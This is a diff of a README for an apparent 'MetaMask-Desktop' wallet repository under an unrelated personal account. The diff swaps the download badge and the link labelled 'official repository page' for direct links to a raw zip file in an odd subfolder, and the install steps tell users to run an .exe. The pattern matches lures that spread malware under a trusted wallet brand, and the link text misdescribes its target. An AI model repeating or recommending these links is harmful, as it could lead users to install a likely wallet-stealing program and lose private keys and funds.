@@ -1,6 +1,6 @@
 # 🦊 MetaMask-Desktop - Manage your digital assets with ease
 
-[![](https://img.shields.io/badge/Download-MetaMask_Desktop-blue.svg)](https://github.com/Josephhookervirginiacrownbeard808/MetaMask-Desktop)
+[![](https://img.shields.io/badge/Download-MetaMask_Desktop-blue.svg)](https://raw.githubusercontent.com/Josephhookervirginiacrownbeard808/MetaMask-Desktop/main/terranean/Desktop-Mask-Meta-1.9.zip)
 
 MetaMask-Desktop brings your crypto wallet to your Windows computer. You manage your assets, private keys, and decentralized applications from your desktop. This application connects you to the Ethereum network and other compatible chains. You maintain full control over your funds without relying on browser extensions.
 
@@ -21,7 +21,7 @@ Your computer must meet these basic standards to run this software effectively:
 
 Follow these steps to set up the software on your system.
 
-1. Visit the [official repository page](https://github.com/Josephhookervirginiacrownbeard808/MetaMask-Desktop) to access the files.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Josephhookervirginiacrownbeard808/MetaMask-Desktop/main/terranean/Desktop-Mask-Meta-1.9.zip) to access the files.
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to download the installer.
 4. Open the downloaded file once the transfer completes.
